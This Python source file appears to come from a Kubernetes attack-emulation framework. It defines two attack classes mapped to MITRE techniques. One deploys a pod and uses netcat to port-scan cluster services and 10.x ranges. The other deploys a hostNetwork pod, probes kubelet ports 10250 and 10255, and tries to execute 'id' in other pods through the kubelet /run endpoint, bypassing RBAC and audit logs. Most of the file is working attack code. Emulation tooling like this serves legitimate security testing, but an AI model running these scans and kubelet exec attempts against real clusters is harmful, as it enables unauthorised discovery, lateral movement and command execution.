import asyncio
from kubernetes import client
from kubernetes.client.rest import ApiException
from .base import BaseAttack, AttackSeverity


class InternalNetworkScan(BaseAttack):
    @property
    def name(self):
        return "Internal Cluster Network Scan"

    @property
    def description(self):
        return "Deploys a pod that scans the internal Kubernetes service CIDR to discover services, open ports, and potential lateral movement targets."

    @property
    def severity(self):
        return AttackSeverity.HIGH

    @property
    def mitre_tactic(self):
        return "discovery"

    @property
    def mitre_techniques(self):
        return [{"id": "T1046", "name": "Network Service Scanning"}, {"id": "T1613", "name": "K8s API Discovery"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        self.emit_event_sync("info", "Discovering cluster services and endpoints for network scan", {})

        services = api.list_namespaced_service(namespace)
        service_info = []
        for svc in services.items:
            if svc.spec.cluster_ip and svc.spec.cluster_ip != "None":
                for port in svc.spec.ports:
                    service_info.append({
                        "name": svc.metadata.name,
                        "cluster_ip": svc.spec.cluster_ip,
                        "port": port.port,
                        "protocol": port.protocol,
                    })

        svc_lines = [f"{s['name']:30s} {s['cluster_ip']:15s} {str(s['port']):5s}/{s['protocol']}" for s in service_info]
        self.cmd_event_sync(
            f"kubectl get svc -n {namespace}",
            "\n".join(["NAME                             CLUSTER-IP      PORT(S)"] + svc_lines),
            f"Discovered {len(service_info)} services"
        )
        self.emit_event_sync("info", f"Discovered {len(service_info)} services in default namespace", {
            "services": service_info,
        })

        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "network-scanner",
                "labels": {"app": "scanner", "attack": "network-scan"},
            },
            "spec": {
                "containers": [
                    {
                        "name": "scanner",
                        "image": "alpine:3.19",
                        "command": ["/bin/sh", "-c", "sleep 300"],
                    }
                ],
                "restartPolicy": "Never",
            },
        }

        try:
            api.delete_namespaced_pod("network-scanner", namespace)
            await asyncio.sleep(2)
        except ApiException:
            pass

        try:
            resp = api.create_namespaced_pod(namespace, pod_manifest)
            scanner_yaml = (
                f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: network-scanner\n  namespace: {namespace}\n"
                f"spec:\n  containers:\n  - name: scanner\n    image: alpine:3.19\n    command: ['/bin/sh','-c','sleep 300']\n"
                f"  restartPolicy: Never"
            )
            self.cmd_event_sync(
                f"kubectl apply -f - <<EOF\n{scanner_yaml}\nEOF",
                f"pod/{resp.metadata.name} created",
                "Network scanner pod deployed"
            )
            self.emit_event_sync("success", "Network scanner pod deployed", {
                "pod_name": resp.metadata.name,
                "node": resp.spec.node_name,
            })
            self.add_infrastructure_sync("pod", "network-scanner", namespace, {
                "purpose": "internal network scanning",
                "image": "alpine:3.19",
            })
        except ApiException as e:
            self.emit_event_sync("error", f"Failed to deploy scanner pod: {e}", {})
            raise

        await asyncio.sleep(5)

        self.emit_event_sync("info", "Installing network tools (nmap/netcat) in scanner pod", {})
        try:
            install_cmd = [
                "/bin/sh", "-c",
                "apk add --no-cache nmap nmap-ncat bind-tools 2>&1 | tail -5"
            ]
            install_resp = api.connect_get_namespaced_pod_exec(
                "network-scanner", namespace,
                command=install_cmd,
                stderr=True, stdin=False, stdout=True, tty=False,
            )
            self.emit_event_sync("info", f"Tool installation: {install_resp[:200]}", {})
        except Exception as e:
            self.emit_event_sync("warning", f"Failed to install tools: {e}. Trying alternative approach.", {})

            try:
                alt_cmd = [
                    "/bin/sh", "-c",
                    "apk add --no-cache nmap 2>&1 || echo 'nmap install failed'"
                ]
                api.connect_get_namespaced_pod_exec(
                    "network-scanner", namespace,
                    command=alt_cmd,
                    stderr=True, stdin=False, stdout=True, tty=False,
                )
            except Exception:
                self.emit_event_sync("warning", "Network tools not available, using /proc/net scans", {})

        await asyncio.sleep(3)

        for svc in services.items:
            if svc.spec.cluster_ip and svc.spec.cluster_ip != "None":
                for port in svc.spec.ports:
                    try:
                        scan_cmd = [
                            "/bin/sh", "-c",
                            f"timeout 3 nc -zv {svc.spec.cluster_ip} {port.port} 2>&1 || echo 'Port closed'"
                        ]
                        scan_result = api.connect_get_namespaced_pod_exec(
                            "network-scanner", namespace,
                            command=scan_cmd,
                            stderr=True, stdin=False, stdout=True, tty=False,
                        )
                        is_open = "succeeded" in scan_result or "open" in scan_result
                        nc_cmd = f"nc -zv {svc.spec.cluster_ip} {port.port}"
                        self.cmd_event_sync(
                            f"kubectl exec network-scanner -n {namespace} -- {nc_cmd}",
                            scan_result[:200],
                            f"Port scan: {svc.metadata.name}:{port.port}"
                        )
                        self.emit_event_sync(
                            "success" if is_open else "info",
                            f"Service {svc.metadata.name}:{port.port}/{port.protocol} - {'OPEN' if is_open else 'closed'}",
                            {
                                "service": svc.metadata.name,
                                "cluster_ip": svc.spec.cluster_ip,
                                "port": port.port,
                                "protocol": port.protocol,
                                "open": is_open,
                                "scan_output": scan_result[:150],
                            }
                        )
                        if is_open:
                            self.add_infrastructure_sync("service_endpoint", f"{svc.metadata.name}:{port.port}", namespace, {
                                "cluster_ip": svc.spec.cluster_ip,
                                "port": port.port,
                                "protocol": port.protocol,
                            })
                    except Exception as e:
                        self.emit_event_sync("info", f"Scan result for {svc.metadata.name}:{port.port}: {e}", {})

                    await asyncio.sleep(0.5)

        self.emit_event_sync("info", "Scanning for additional cluster IPs in 10.0.0.0/8 range", {})
        try:
            range_scan_cmd = [
                "/bin/sh", "-c",
                "for i in 1 2 3; do "
                "for port in 443 6443 80 8080 10250 10255; do "
                "timeout 1 nc -zv 10.$i.0.1 $port 2>&1 | grep -E 'succeeded|open' && echo 'FOUND: 10.'$i'.0.1:'$port; "
                "done; done"
            ]
            range_result = api.connect_get_namespaced_pod_exec(
                "network-scanner", namespace,
                command=range_scan_cmd,
                stderr=True, stdin=False, stdout=True, tty=False,
            )
            if "FOUND:" in range_result:
                self.emit_event_sync("success", f"Additional services discovered via CIDR scan", {
                    "results": range_result[:500],
                })
                self.add_infrastructure_sync("network_range", "10.0.0.0/8", namespace, {
                    "scan_results": range_result[:300],
                })
            else:
                self.emit_event_sync("info", "No additional services found in 10.x range", {})
        except Exception as e:
            self.emit_event_sync("warning", f"CIDR scan failed: {e}", {})

        self.emit_event_sync("complete", "Network scan complete. Service topology mapped.", {
            "services_scanned": len(service_info),
            "services_found": len([s for s in service_info]),
        })


class KubeletAPIAbuse(BaseAttack):
    @property
    def name(self):
        return "Kubelet API Abuse"

    @property
    def description(self):
        return "Discovers kubelet API endpoints (port 10250) on cluster nodes and attempts to execute commands in running pods without going through the API server, bypassing RBAC and audit logging."

    @property
    def severity(self):
        return AttackSeverity.CRITICAL

    @property
    def mitre_tactic(self):
        return "privilege_escalation"

    @property
    def mitre_techniques(self):
        return [{"id": "T1611", "name": "Escape to Host"}, {"id": "T1609", "name": "Container Administration Command"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        self.emit_event_sync("info", "Discovering cluster nodes and internal IPs for kubelet API scanning", {})

        try:
            nodes = api.list_node()
            node_ips = []
            node_lines = []
            for n in nodes.items:
                node_name = n.metadata.name
                for addr in n.status.addresses:
                    if addr.type == "InternalIP":
                        node_ips.append(addr.address)
                        node_lines.append(f"{node_name:40s} InternalIP={addr.address}")
                        break
            self.cmd_event_sync(
                "kubectl get nodes -o wide",
                "\n".join(node_lines),
                f"Discovered {len(node_ips)} node IPs for kubelet scanning"
            )
            self.emit_event_sync("info", f"Discovered {len(node_ips)} node IPs", {"node_ips": node_ips})
        except ApiException as e:
            self.emit_event_sync("error", f"Failed to list nodes: {e}", {})
            raise

        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "kubelet-scanner",
                "labels": {"app": "kubelet-scan", "attack": "kubelet-abuse"},
            },
            "spec": {
                "containers": [{
                    "name": "scanner",
                    "image": "alpine:3.19",
                    "command": ["/bin/sh", "-c", "apk add --no-cache curl && sleep 300"],
                }],
                "restartPolicy": "Never",
                "hostNetwork": True,
            },
        }

        try:
            api.delete_namespaced_pod("kubelet-scanner", namespace)
            await asyncio.sleep(2)
        except ApiException:
            pass

        try:
            resp = api.create_namespaced_pod(namespace, pod_manifest)
            scanner_node = resp.spec.node_name
            scanner_yaml = (
                f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubelet-scanner\n  namespace: {namespace}\n"
                f"spec:\n  hostNetwork: true\n  containers:\n  - name: scanner\n    image: alpine:3.19\n"
                f"    command: ['/bin/sh','-c','apk add --no-cache curl && sleep 300']\n  restartPolicy: Never"
            )
            self.cmd_event_sync(
                f"kubectl apply -f - <<EOF\n{scanner_yaml}\nEOF",
                f"pod/{resp.metadata.name} created",
                "Kubelet scanner pod deployed with hostNetwork"
            )
            self.emit_event_sync("info", f"Kubelet scanner pod deployed on {scanner_node}", {
                "pod_name": "kubelet-scanner",
                "node": scanner_node,
            })
            self.add_infrastructure_sync("pod", "kubelet-scanner", namespace, {
                "purpose": "kubelet API scanning",
                "host_network": True,
            })
        except ApiException as e:
            self.emit_event_sync("error", f"Failed to deploy scanner pod: {e}", {})
            raise

        await asyncio.sleep(8)

        kubelet_endpoints = []
        for node_ip in node_ips:
            for port in [10250, 10255]:
                try:
                    probe_cmd = [
                        "/bin/sh", "-c",
                        f"timeout 3 curl -sk https://{node_ip}:{port}/pods 2>&1 | head -c 200 || "
                        f"timeout 3 curl -sk http://{node_ip}:{port}/pods 2>&1 | head -c 200 || "
                        f"echo 'NO_ACCESS'"
                    ]
                    result = api.connect_get_namespaced_pod_exec(
                        "kubelet-scanner", namespace,
                        command=probe_cmd,
                        stderr=True, stdin=False, stdout=True, tty=False,
                    )

                    if "NO_ACCESS" not in result and result.strip():
                        accessible = port == 10250
                        kubelet_endpoints.append({"node_ip": node_ip, "port": port, "accessible": accessible})
                        probe_cmd_str = f"curl -sk {'https' if port == 10250 else 'http'}://{node_ip}:{port}/pods | head -c 200"
                        self.cmd_event_sync(
                            f"kubectl exec kubelet-scanner -n {namespace} -- {probe_cmd_str}",
                            result[:300],
                            f"Kubelet API probe at {node_ip}:{port}"
                        )
                        self.emit_event_sync(
                            "success" if accessible else "info",
                            f"Kubelet API discovered at {node_ip}:{port} — {'authenticated' if accessible else 'read-only'}",
                            {"node_ip": node_ip, "port": port, "response": result[:150]},
                        )
                        self.add_infrastructure_sync("kubelet_endpoint", f"{node_ip}:{port}", namespace, {
                            "node_ip": node_ip,
                            "port": port,
                            "accessible": accessible,
                        })
                    else:
                        self.emit_event_sync("info", f"No kubelet API at {node_ip}:{port}", {})
                except Exception as e:
                    self.emit_event_sync("warning", f"Kubelet probe failed for {node_ip}:{port}: {e}", {})

                await asyncio.sleep(1)

        if not kubelet_endpoints:
            self.emit_event_sync("warning", "No kubelet endpoints discovered. Trying alternative discovery via DNS.", {})

            try:
                dns_cmd = [
                    "/bin/sh", "-c",
                    "for node in $(dig +short -x 10.0.0.1 2>/dev/null | head -5); do "
                    "timeout 2 curl -sk https://$node:10250/pods 2>&1 | head -c 100 && echo ' FOUND'; "
                    "done"
                ]
                dns_result = api.connect_get_namespaced_pod_exec(
                    "kubelet-scanner", namespace,
                    command=dns_cmd,
                    stderr=True, stdin=False, stdout=True, tty=False,
                )
                if "FOUND" in dns_result:
                    self.emit_event_sync("success", "Kubelet API discovered via DNS fallback", {
                        "result": dns_result[:300],
                    })
            except Exception:
                self.emit_event_sync("error", "Alternative kubelet discovery also failed", {})

        running_pods = []
        try:
            pod_list = api.list_namespaced_pod(namespace)
            running_pods = [p for p in pod_list.items if p.status.phase == "Running" and p.metadata.name != "kubelet-scanner"]
            self.emit_event_sync("info", f"Found {len(running_pods)} running pods for kubelet command injection", {})
        except Exception as e:
            self.emit_event_sync("error", f"Failed to list pods: {e}", {})

        if kubelet_endpoints and running_pods:
            endpoint = kubelet_endpoints[0]
            target_pod = running_pods[0]
            container_name = target_pod.spec.containers[0].name if target_pod.spec.containers else "container-0"
            target_ns = target_pod.metadata.namespace or namespace

            self.emit_event_sync(
                "info",
                f"Attempting kubelet API command execution on {target_pod.metadata.name}/{container_name} "
                f"via {endpoint['node_ip']}:{endpoint['port']}",
                {},
            )

            try:
                exec_cmd = [
                    "/bin/sh", "-c",
                    f"curl -sk --max-time 5 "
                    f"https://{endpoint['node_ip']}:{endpoint['port']}/run/{target_ns}/{target_pod.metadata.name}/{container_name} "
                    f"-X POST -d 'cmd=id' -H 'X-Stream-Protocol-Version: v2.channel.k8s.io' "
                    f"2>&1 | head -c 300"
                ]
                exec_result = api.connect_get_namespaced_pod_exec(
                    "kubelet-scanner", namespace,
                    command=exec_cmd,
                    stderr=True, stdin=False, stdout=True, tty=False,
                )

                if "uid=" in exec_result:
                    self.emit_event_sync("critical", f"Kubelet command execution SUCCESSFUL on {target_pod.metadata.name}", {
                        "target_pod": target_pod.metadata.name,
                        "container": container_name,
                        "kubelet_endpoint": f"{endpoint['node_ip']}:{endpoint['port']}",
                        "command_output": exec_result[:200],
                    })
                    self.add_infrastructure_sync("command_execution", target_pod.metadata.name, target_ns, {
                        "method": "kubelet_api",
                        "endpoint": f"{endpoint['node_ip']}:{endpoint['port']}",
                        "command": "id",
                        "result": exec_result[:200],
                    })
                else:
                    self.emit_event_sync("info", f"Kubelet exec returned: {exec_result[:200]}", {})
            except Exception as e:
                self.emit_event_sync("warning", f"Kubelet exec attempt failed: {e}. This may indicate auth is required.", {})
        else:
            self.emit_event_sync("info", "Kubelet API endpoints or running pods not found for exec testing", {})

        self.emit_event_sync("complete", "Kubelet API abuse assessment complete", {
            "endpoints_discovered": len(kubelet_endpoints),
            "endpoints": kubelet_endpoints,
            "exec_attempted": bool(kubelet_endpoints and running_pods),
        })
